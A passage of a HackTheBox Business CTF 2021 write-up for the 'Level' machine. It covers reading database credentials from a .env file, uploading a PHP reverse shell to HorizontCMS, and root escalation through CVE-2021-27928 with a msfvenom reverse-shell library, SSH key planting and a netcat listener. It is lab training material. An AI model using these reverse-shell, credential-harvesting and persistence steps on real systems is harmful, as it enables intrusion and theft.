+<p><strong>Enumerate directory /var/www/html</strong>
+go to <code class="language-plaintext highlighter-rouge">/var/www/html</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cd</span> /var/www/html
+<span class="nb">ls</span> <span class="nt">-la</span>
+total 788
+drwxr-xr-x 12 albert albert   4096 Jun 18 12:02 <span class="nb">.</span>
+drwxr-xr-x  4 root   root     4096 Jun 18 11:57 ..
+drwxr-xr-x 12 albert albert   4096 Jun 18 11:57 app
+<span class="nt">-rw-r--r--</span>  1 albert albert   1646 Jul 13  2020 artisan
+drwxr-xr-x  3 albert albert   4096 Jun 18 11:57 bootstrap
+<span class="nt">-rw-r--r--</span>  1 albert albert   2473 Jul 13  2020 composer.json
+<span class="nt">-rw-r--r--</span>  1 albert albert 225292 Jul 13  2020 composer.lock
+drwxr-xr-x  2 albert albert   4096 Jul 17 02:58 config
+drwxr-xr-x  5 albert albert   4096 Jun 18 11:57 database
+<span class="nt">-rw-r--r--</span>  1 albert albert    125 Jun 16 08:46 .env
+<span class="nt">-rw-r--r--</span>  1 albert albert     61 Jul 13  2020 .gitattributes
+<span class="nt">-rw-r--r--</span>  1 albert albert    288 Jul 13  2020 .gitignore
+<span class="nt">-rw-r--r--</span>  1 albert albert    534 Jul 13  2020 git-patcher.sh
+<span class="nt">-rw-r--r--</span>  1 albert albert    556 Jul 13  2020 .htaccess
+<span class="nt">-rw-r--r--</span>  1 albert albert   1776 Jul 13  2020 index.php
+<span class="nt">-rw-r--r--</span>  1 albert albert   1070 Jul 13  2020 LICENSE
+<span class="nt">-rw-r--r--</span>  1 albert albert   1147 Jul 13  2020 package.json
+<span class="nt">-rw-r--r--</span>  1 albert albert 463966 Jul 13  2020 package-lock.json
+<span class="nt">-rw-r--r--</span>  1 albert albert   1658 Jul 13  2020 phpunit.xml
+drwxr-xr-x  2 albert albert   4096 Jun 18 11:57 plugins
+<span class="nt">-rw-r--r--</span>  1 albert albert   2908 Jul 13  2020 README.md
+drwxr-xr-x  9 albert albert   4096 Jun 18 11:57 resources
+drwxr-xr-x  2 albert albert   4096 Jun 18 12:02 routes
+<span class="nt">-rw-r--r--</span>  1 albert albert    560 Jul 13  2020 server.php
+drwxr-xr-x  5 albert albert   4096 Jun 18 11:57 storage
+drwxr-xr-x  3 albert albert   4096 Jun 18 11:57 themes
+<span class="nt">-rw-r--r--</span>  1 albert albert    866 Jul 13  2020 .travis.yml
+drwxr-xr-x 46 albert albert   4096 Jun 18 12:02 vendor
+<span class="nt">-rw-r--r--</span>  1 albert albert    581 Jul 13  2020 webpack.mix.js
+</code></pre></div></div>
+<p>see the <code class="language-plaintext highlighter-rouge">.env</code> file</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat</span> .env
+<span class="nv">DB_HOST</span><span class="o">=</span>127.0.0.1
+<span class="nv">DB_CONNECTION</span><span class="o">=</span>mysql
+<span class="nv">DB_USERNAME</span><span class="o">=</span>hcms
+<span class="nv">DB_PASSWORD</span><span class="o">=</span>N&gt;2sM4^R_j&gt;g<span class="o">)</span>cfe
+<span class="nv">DB_DATABASE</span><span class="o">=</span>hcms
+<span class="nv">HCMS_ADMIN_PREFIX</span><span class="o">=</span>admin
+</code></pre></div></div>
+<p>Now we have <code class="language-plaintext highlighter-rouge">HorizontCMS</code> creds is <code class="language-plaintext highlighter-rouge">admin:N&gt;2sM4^R_j&gt;g)cfe</code>.Let’s exit from the metasploit, and change to <code class="language-plaintext highlighter-rouge">exploit/multi/http/horizontcms_upload_exe</code></p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">exit
+</span>meterpreter <span class="o">&gt;</span> background
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Backgrounding session 1...
+msf6 exploit<span class="o">(</span>multi/http/apache_flink_jar_upload_exec<span class="o">)</span> <span class="o">&gt;</span> search <span class="s1">'HorizontCMS'</span>
+
+Matching Modules
+<span class="o">================</span>
+
+   <span class="c">#  Name                                        Disclosure Date  Rank       Check  Description</span>
+   -  <span class="nt">----</span>                                        <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
+   0  exploit/multi/http/horizontcms_upload_exec  2020-09-24       excellent  Yes    HorizontCMS Arbitrary PHP File Upload
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/http/horizontcms_upload_exec
+</code></pre></div></div>
+<p>Unfortunately, our metasploit couldn’t make a shell from exploit,</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>SNIP]
+msf6 exploit<span class="o">(</span>multi/http/horizontcms_upload_exec<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 10.10.14.172:4445 
+<span class="o">[!]</span> AutoCheck is disabled, proceeding with exploitation
+<span class="o">[</span>-] Exploit aborted due to failure: unknown: Failed to obtain the csrf token required <span class="k">for </span>authentication.
+<span class="o">[</span>-] Failed to delete the payload.
+<span class="o">[!]</span> Manual cleanup of  is required.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Exploit completed, but no session was created.
+msf6 exploit<span class="o">(</span>multi/http/horizontcms_upload_exec<span class="o">)</span> <span class="o">&gt;</span>
+</code></pre></div></div>
+<p>so we manualy to upload our exploit to <code class="language-plaintext highlighter-rouge">HorizontCMS</code>.</p>
+<ul>
+  <li>Login to <code class="language-plaintext highlighter-rouge">http://10.129.85.134/admin/</code> as <code class="language-plaintext highlighter-rouge">admin:N&gt;2sM4^R_j&gt;g)cfe</code></li>
+  <li>Navigate to Media &gt; Files, upload our reverse shell from <code class="language-plaintext highlighter-rouge">/usr/share/webshells/php/php-reverse-shell.php</code>, we need add our ip address, and port listener is 4444</li>
+  <li>We need rename our php reverse shell (in this case renamed to <code class="language-plaintext highlighter-rouge">rev.php</code>). Now we have our php reverse shell
+<img src="/assets/images/htbbiz2021-level/upload-shell.png" alt="Upload PHP reverse shell" /></li>
+  <li>Let’s run our php reverse shell <code class="language-plaintext highlighter-rouge">http://10.129.85.134/storage/rev.php</code> and prepare netcat listener <code class="language-plaintext highlighter-rouge">nc -lvnp 4444</code>
+    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-lvnp</span> 4444
+Ncat: Version 7.91 <span class="o">(</span> https://nmap.org/ncat <span class="o">)</span>
+Ncat: Listening on :::4444
+Ncat: Listening on 0.0.0.0:4444
+Ncat: Connection from 10.129.85.134.
+Ncat: Connection from 10.129.85.134:48762.
+Linux level 5.4.0-48-generic <span class="c">#52-Ubuntu SMP Thu Sep 10 10:58:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 15:47:41 up  2:06,  0 <span class="nb">users</span>,  load average: 0.08, 0.02, 0.01
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>albert<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>albert<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>albert<span class="o">)</span>
+/bin/sh: 0: can<span class="s1">'t access tty; job control turned off
+$ whoami
+albert
+$ cd /home/albert
+$ ls -la
+total 28
+drwxr-xr-x 3 albert albert 4096 Jun 24 05:18 .
+drwxr-xr-x 3 root   root   4096 Jun 16 10:05 ..
+lrwxrwxrwx 1 albert albert    9 Jun 16 08:41 .bash_history -&gt; /dev/null
+-rw-r--r-- 1 albert albert  220 Jun 16 08:41 .bash_logout
+-rw-r--r-- 1 albert albert 3797 Jun 16 08:41 .bashrc
+-rw-r--r-- 1 albert albert  807 Jun 16 08:41 .profile
+drwx------ 2 albert albert 4096 Jun 16 09:58 .ssh
+-r-------- 1 albert albert   29 Jun 24 05:18 user.txt
+$ cat user.txt
+HTB{0utd4t3d_cms_1s_n0_g00d}
+$
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Go back to <code class="language-plaintext highlighter-rouge">.env</code>. Now we need login as database.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">DB_HOST</span><span class="o">=</span>127.0.0.1
+<span class="nv">DB_CONNECTION</span><span class="o">=</span>mysql
+<span class="nv">DB_USERNAME</span><span class="o">=</span>hcms
+<span class="nv">DB_PASSWORD</span><span class="o">=</span>N&gt;2sM4^R_j&gt;g<span class="o">)</span>cfe
+<span class="nv">DB_DATABASE</span><span class="o">=</span>hcms
+<span class="nv">HCMS_ADMIN_PREFIX</span><span class="o">=</span>admin
+</code></pre></div></div>
+<p>Login to database</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>albert@level:/home/albert<span class="nv">$ </span>mysql <span class="nt">-u</span> hcms <span class="nt">-h</span> 127.0.0.1 hcms <span class="nt">-p</span>
+mysql <span class="nt">-u</span> hcms <span class="nt">-h</span> 127.0.0.1 hcms <span class="nt">-p</span>
+Enter password: N&gt;2sM4^R_j&gt;g<span class="o">)</span>cfe
+
+Reading table information <span class="k">for </span>completion of table and column names
+You can turn off this feature to get a quicker startup with <span class="nt">-A</span>
+
+Welcome to the MariaDB monitor.  Commands end with <span class="p">;</span> or <span class="se">\g</span><span class="nb">.</span>
+Your MariaDB connection <span class="nb">id </span>is 182
+Server version: 10.5.8-MariaDB MariaDB Server
+
+Copyright <span class="o">(</span>c<span class="o">)</span> 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type <span class="s1">'help;'</span> or <span class="s1">'\h'</span> <span class="k">for </span>help. Type <span class="s1">'\c'</span> to clear the current input statement.
+
+MariaDB <span class="o">[</span>hcms]&gt; 
+</code></pre></div></div>
+<p>Database engine <code class="language-plaintext highlighter-rouge">10.5.8-MariaDB MariaDB Server</code>, we follow tutorial from <a href="https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html">MariaDB 10.2 Command Execution</a></p>
+
+<p><strong>Proof of Concept:</strong></p>
+<ul>
+  <li>Create the reverse shell payload
+<code class="language-plaintext highlighter-rouge">msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.172 LPORT=4445 -f elf-so -o CVE-2021-27928.so</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>msfvenom <span class="nt">-p</span> linux/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.172 <span class="nv">LPORT</span><span class="o">=</span>4445 <span class="nt">-f</span> elf-so <span class="nt">-o</span> CVE-2021-27928.so
+<span class="o">[</span>-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+<span class="o">[</span>-] No <span class="nb">arch </span>selected, selecting <span class="nb">arch</span>: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf-so file: 476 bytes
+Saved as: CVE-2021-27928.so
+</code></pre></div></div>
+<ul>
+  <li>In our kali linux machine. Let’s create a ssh key and upload to target machine</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh-keygen                                                                                              130 ⨯
+Generating public/private rsa key pair.
+Enter file <span class="k">in </span>which to save the key <span class="o">(</span>/twseptian/.ssh/id_rsa<span class="o">)</span>: /twseptian/lab/hackthebox/ctf-business-2021/level/ssh/id_rsa
+Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>: 
+Enter same passphrase again: 
+Your identification has been saved <span class="k">in</span> /twseptian/lab/hackthebox/ctf-business-2021/level/ssh/id_rsa
+Your public key has been saved <span class="k">in</span> /twseptian/lab/hackthebox/ctf-business-2021/level/ssh/id_rsa.pub
+The key fingerprint is:
+SHA256:+MYaM2Y+........[SNIP] twseptian@kali
+The key<span class="s1">'s randomart image is:
++---[RSA 3072]----+
+|     .+=+=Eo     |
+|     .. = o      |
+|      +B .       |
+|     .o== .      |
+|    o +*S.       |
+|   . oo=+o .     |
+|     .Bo=o+      |
+|    .++O=.       |
+|     o=B+        |
++----[SHA256]-----+
+</span></code></pre></div></div>
+<p>copy our <code class="language-plaintext highlighter-rouge">id_rsa.pub</code> to target machine</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>albert@level:/home/albert/.ssh<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'ssh-rsa AAAAB3...........[SNIP] twseptian@kali'</span> <span class="o">&gt;&gt;</span> authorized_keys
+</code></pre></div></div>
+<p>Now we can remote target machine using our <code class="language-plaintext highlighter-rouge">id_rsa</code></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> id_rsa albert@10.129.85.134        
+Enter passphrase <span class="k">for </span>key <span class="s1">'id_rsa'</span>: 
+Welcome to Ubuntu 20.04.1 LTS <span class="o">(</span>GNU/Linux 5.4.0-48-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 26 Jul 2021 05:06:46 PM UTC
+
+  System load:  0.01              Processes:             181
+  Usage of /:   66.9% of 9.51GB   Users logged <span class="k">in</span>:       0
+  Memory usage: 29%               IPv4 address <span class="k">for </span>eth0: 10.129.85.134
+  Swap usage:   0%
+
+ <span class="k">*</span> Super-optimized <span class="k">for </span>small spaces - <span class="nb">read </span>how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+155 updates can be installed immediately.
+73 of these updates are security updates.
+To see these additional updates run: apt list <span class="nt">--upgradable</span>
+
+
+The list of available updates is more than a week old.
+To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update
+
+
+The programs included with the Ubuntu system are free software<span class="p">;</span>
+the exact distribution terms <span class="k">for </span>each program are described <span class="k">in </span>the
+individual files <span class="k">in</span> /usr/share/doc/<span class="k">*</span>/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+albert@level:~<span class="err">$</span>
+</code></pre></div></div>
+
+<ul>
+  <li>In our kali machine copy the payload to the target machine (In this example, SCP/SSH is used)
+<code class="language-plaintext highlighter-rouge">scp -i ssh/id_rsa CVE-2021-27928.so albert@10.129.85.134:/tmp/CVE-2021-27928.so</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>scp <span class="nt">-i</span> ssh/id_rsa CVE-2021-27928.so albert@10.129.85.134:/tmp/CVE-2021-27928.so                           1 ⨯
+Enter passphrase <span class="k">for </span>key <span class="s1">'ssh/id_rsa'</span>: 
+CVE-2021-27928.so                                                               100%  476     1.1KB/s   00:00  
+</code></pre></div></div>
+
+<ul>
+  <li>Execute the payload
+<code class="language-plaintext highlighter-rouge">mysql -u hcms -p -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</code></li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>albert@level:/tmp<span class="nv">$ </span>mysql <span class="nt">-u</span> hcms <span class="nt">-p</span> <span class="nt">-e</span> <span class="s1">'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</span>
+Enter password: 
+ERROR 2013 <span class="o">(</span>HY000<span class="o">)</span> at line 1: Lost connection to MySQL server during query
+albert@level:/tmp<span class="nv">$ </span>
+</code></pre></div></div>
+<p><img src="/assets/images/htbbiz2021-level/wsrep.png" alt="wsrep_provide" /></p>
+
+<ul>
+  <li>start a netcat listener <code class="language-plaintext highlighter-rouge">nc -lvnp 4445</code>
+<img src="/assets/images/htbbiz2021-level/root.png" alt="root" /></li>
+</ul>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/tags/#cve-2020-17519" class="page__taxonomy-item" rel="tag">CVE-2020-17519</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#cve-2020-27387" class="page__taxonomy-item" rel="tag">CVE-2020-27387</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/tags/#hackthebox-business-ctf-2021" class="page__taxonomy-item" rel="tag">HackTheBox Business CTF 2021</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+  
+  
+
+  <p class="page__taxonomy">
+  
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      
+      
+      <a href="/categories/#ctf" class="page__taxonomy-item" rel="tag">CTF</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hackthebox-business-ctf-2021" class="page__taxonomy-item" rel="tag">HackTheBox Business CTF 2021</a><span class="sep">, </span>
+    
+      
+      
+      <a href="/categories/#hackthebox" class="page__taxonomy-item" rel="tag">HackTheBox</a>
+    
+    </span>
+  </p>
+
+
+        
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2021-07-27">July 27, 2021</time></p>
+
+
+      </footer>
+      
+      
+  <nav class="pagination">
+    
+      <a href="/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-discordvm/" class="pagination--pager" title="HackTheBox Business CTF 2021 - Discordvm (Misc)
+">Previous</a>
+    
+    
+      <a href="/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-manager/" class="pagination--pager" title="HackTheBox Business CTF 2021 - Manager (Fullpwn)
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+    <div class="page__related">
+      <h4 class="page__related-title">You may also enjoy</h4>
+      <div class="grid__wrapper">
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/CEH-Practical-Logo.jpg" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/penetration%20testing/ceh%20practical/ceh_practical/" rel="permalink">Pengalaman Ujian Sertifikasi CEH Practical
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-16T15:19:00+07:00">January 16, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          3 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Berikut cerita pengalaman saya untuk lulus ujian CEH Practical yang ingin saya bagikan untuk orang yang sedang atau ingin mengambil sertifikasi CEH Practical.
+</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/orrsv1.0-sql-injection/" rel="permalink">Online Railway Reservation System 1.0 - ‘id’ SQL Injection (Unauthenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-07T00:00:00+07:00">January 7, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Railway Reservation System 1.0 - 'id' SQL Injection (Unauthenticated)
+- Date: 07/01/2022
+- Exploit Au...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/ovas-v1.0-multiple-sql-injection/" rel="permalink">Online Veterinary Appointment System 1.0 - ‘Multiple’ SQL Injection
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2022-01-05T00:00:00+07:00">January 5, 2022</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Online Veterinary Appointment System 1.0 - 'Multiple' SQL Injection
+- Date: 05/01/20222
+- Exploit Author: tw...</p>
+  </article>
+</div>
+
+        
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+      <div class="archive__item-teaser">
+        <img src="/assets/images/teaser.png" alt="">
+      </div>
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/exploit-db/hprmsv1.0-sql-injection/" rel="permalink">Hospitals Patient Records Management System 1.0 - ‘id’ SQL Injection (Authenticated)
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        <time datetime="2021-12-30T00:00:00+07:00">December 30, 2021</time>
+      </span>
+    
+    
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          less than 1 minute read
+        
+      </span>
+        
+  </p>
+  
+
+
+    <p class="archive__item-excerpt" itemprop="description">Information about vulnerability
+- Exploit Title: Hospital's Patient Records Management System v1.0 - 'id' SQL Injection (Authenticated)
+- Date: 2021-12-30
+- ...</p>
+  </article>
+</div>
+
+        
+      </div>
+    </div>
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    <!-- <li><b>Support My Works: </b><a href="https://www.buymeacoffee.com/twseptian"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me a coffee&emoji=&slug=twseptian&button_colour=0ecd34&font_colour=000000&font_family=Lato&outline_colour=000000&coffee_colour=FFDD00" width="150",height="150"></a></li> -->
+    
+      <li><strong>Follow:</strong></li>
+    
+    
+      
+        
+      
+          <li><a href="https://www.buymeacoffee.com/twseptian" rel="nofollow noopener noreferrer"><i class="fas fa-mug-hot" aria-hidden="true"></i> Buy Me a Coffee</a>
+          </li>
+        
+      
+    
+    
+    <li><a href="/feed.xml"><i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> Feed</a></li>
+  </ul>
+
+</div>
+<div class="page__footer-copyright">&copy; 2023 Tri Wanda Septian's Blog and Stuff | Powered by <a href="https://jekyllrb.com/">Jekyll</a> & <a href="https://mmistakes.github.io/minimal-mistakes/about/">Minimal Mistakes</a> | Build with ❤.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+    
+  <script>
+    var disqus_config = function () {
+      this.page.url = "http://localhost:4000/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-level/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/hackthebox/hackthebox%20business%20ctf%202021/ctf/htbbiz2021-level"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+    };
+    (function() { /* DON'T EDIT BELOW THIS LINE */
+      var d = document, s = d.createElement('script');
+      s.src = 'https://https-twseptian-github-io.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+
+
+  
+
+
+
+
+
+  </body>
+</html>
